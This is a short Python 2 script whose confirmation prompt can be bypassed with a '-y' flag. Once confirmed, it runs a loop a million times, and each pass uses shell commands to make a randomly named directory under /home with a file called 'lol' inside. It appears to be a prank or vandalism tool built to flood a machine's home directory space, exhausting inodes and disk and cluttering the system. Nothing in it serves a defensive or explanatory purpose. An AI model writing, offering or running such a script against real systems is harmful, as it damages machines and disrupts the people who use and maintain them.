#!/usr/bin/env python

import random
import string
import os
import sys

directory = ''

def randomstring():
    output= ''
    for i in range(25):  # @UnusedVariable
        output += random.choice(string.letters)
    return output

def fuckem():
    for i in range(1000000):  # @UnusedVariable
        directory = randomstring()
        os.system("mkdir /home/"  + directory)
        os.system("touch /home/" + directory + "/lol")

if len(sys.argv) == 1:
    userinput = raw_input("You sure?")
    if userinput == 'yes':
        fuckem()
    else:
        print "That's a no."
elif len(sys.argv) == 2 and sys.argv[1] == '-y':
        fuckem()
else:
    print "Saving yourself"